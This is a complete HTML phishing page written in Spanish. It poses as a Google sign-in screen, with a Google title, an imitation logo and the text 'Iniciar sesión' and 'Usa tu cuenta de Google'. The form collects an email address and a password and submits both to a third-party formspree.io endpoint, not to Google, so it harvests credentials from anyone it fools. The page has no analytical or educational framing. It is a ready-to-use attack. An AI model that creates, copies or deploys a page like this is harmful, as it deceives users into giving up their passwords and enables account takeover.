<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google</title>
<style>
body { font-family: 'Roboto', sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
.container { width: 100%; max-width: 450px; padding: 40px; box-sizing: border-box; text-align: center; }
.logo { margin-bottom: 20px; }
h1 { font-size: 24px; color: #202124; font-weight: 400; margin-bottom: 10px; }
p { font-size: 16px; color: #5f6368; margin-bottom: 25px; }
.form-group { margin-bottom: 20px; position: relative; }
input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
input:focus { border-color: #4285f4; box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.1); }
.button-container { display: flex; justify-content: flex-end; margin-top: 25px; }
button { background-color: #4285f4; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
button:hover { background-color: #357ae8; box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15); }
</style>
</head>
<body>
<div class="container">
<div class="logo">
<svg width="74" height="24" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M9.243 19.308V5.536h4.946l.524 2.246h.21c.672-.966 1.526-1.715 2.562-2.246 1.036-.532 2.184-.798 3.444-.798 2.324 0 4.088.735 5.292 2.205 1.204 1.47 1.806 3.647 1.806 6.531 0 1.96-.322 3.66-.966 5.098a7.26 7.26 0 0 1-2.718 3.15c-1.162.728-2.508 1.092-4.038 1.092-1.26 0-2.38-.266-3.36-.798a5.608 5.608 0 0 1-2.262-2.142l-.336 2.514H9.243zm6.768-3.822c.84 0 1.548-.196 2.124-.588a3.638 3.638 0 0 0 1.284-1.638c.288-.672.432-1.434.432-2.286 0-1.356-.294-2.424-.882-3.204-.588-.78-1.434-1.17-2.538-1.17-.672 0-1.266.162-1.782.486a3.3 3.3 0 0 0-1.218 1.332c-.3.576-.45 1.23-.45 1.962v3.822c.312.312.69.564 1.134.756.444.192.942.288 1.494.288z" fill="#4285F4"/><path d="M58.48 19.308c-1.512 0-2.846-.266-4.002-.798a5.696 5.696 0 0 1-2.628-2.31c-.624-.99-.936-2.178-.936-3.564 0-1.386.312-2.574.936-3.564a5.696 5.696 0 0 1 2.628-2.31c1.156-.532 2.49-.798 4.002-.798 1.512 0 2.846.266 4.002.798a5.696 5.696 0 0 1 2.628 2.31c.624.99.936 2.178.936 3.564 0 1.386-.312 2.574-.936 3.564a5.696 5.696 0 0 1-2.628 2.31c-1.156.532-2.49.798-4.002.798zm-2.628-6.672c0 1.356.294 2.424.882 3.204.588.78 1.434 1.17 2.538 1.17.84 0 1.548-.196 2.124-.588a3.638 3.638 0 0 0 1.284-1.638c.288-.672.432-1.434.432-2.286 0-1.356-.294-2.424-.882-3.204-.588-.78-1.434-1.17-2.538-1.17-.672 0-1.266.162-1.782.486a3.3 3.3 0 0 0-1.218 1.332c-.3.576-.45 1.23-.45 1.962v3.822c.312.312.69.564 1.134.756.444.192.942.288 1.494.288z" fill="#EA4335"/></g></svg>
</div>
<h1>Iniciar sesión</h1>
<p>Usa tu cuenta de Google</p>
<form action="https://formspree.io/f/xpqoebvb" method="POST">
<div class="form-group">
<input type="email" name="email" placeholder="Correo electrónico" required>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Contraseña" required>
</div>
<div class="button-container">
<button type="submit">Siguiente</button>
</div>
</form>
</div>
</body>
</html>
